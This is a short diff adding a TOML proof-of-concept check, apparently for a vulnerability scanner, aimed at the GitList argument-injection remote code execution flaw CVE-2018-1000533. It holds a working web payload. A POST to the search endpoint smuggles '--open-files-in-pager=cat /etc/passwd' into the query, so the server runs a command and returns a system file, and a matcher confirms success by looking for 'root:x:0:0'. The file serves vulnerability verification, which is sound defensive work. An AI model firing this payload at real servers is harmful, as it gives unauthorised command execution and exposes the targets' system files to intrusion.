@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "验证 GitList <= 0.6.0 searchTree 函数参数注入远程代码执行漏洞。通过向搜索接口发送包含 --open-files-in-pager 选项的请求触发命令执行。"
+id = "POC-AVE-2018-0023"
+name = "GitList < 0.6.0 Remote Code Execution PoC"
+severity = "critical"
+tags = ["ave-2018-0023"]
+vuln_id = [
+    "CVE-2018-1000533",
+    "AVE-2018-0023",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/tree/a/search"
+protocol = "http"
+
+[poc.requests.body]
+content = "query=--open-files-in-pager=cat%20/etc/passwd"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:x:0:0"]
